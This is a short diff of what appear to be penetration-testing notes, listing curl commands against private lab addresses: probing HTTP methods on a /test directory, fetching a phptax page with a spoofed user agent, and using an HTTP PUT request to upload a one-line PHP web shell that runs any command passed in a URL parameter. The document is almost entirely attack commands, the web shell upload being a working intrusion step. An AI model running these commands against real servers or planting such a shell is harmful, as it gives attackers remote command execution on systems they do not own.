@@ -83,8 +83,8 @@ GET /index
 ## HTTP methods. Inspecting the response of the OPTIONS verb on the /test directory.
 curl -v -X OPTIONS http://192.168.230.153/test/
 
-# check HTTP methods. Inspecting the response of the OPTIONS verb on the /test directory.
-curl -v -X OPTIONS http://192.168.230.153/test/
+#get page with different user agent
+curl -H "User-Agent:Mozilla/4.0" http://192.168.31.146:8080/phptax/ | head -n2
 
 # create a .php file in /test directory with curl. 
 curl -X PUT -d '<?php system($_GET["c"]);' http://192.168.56.103/test/1.php
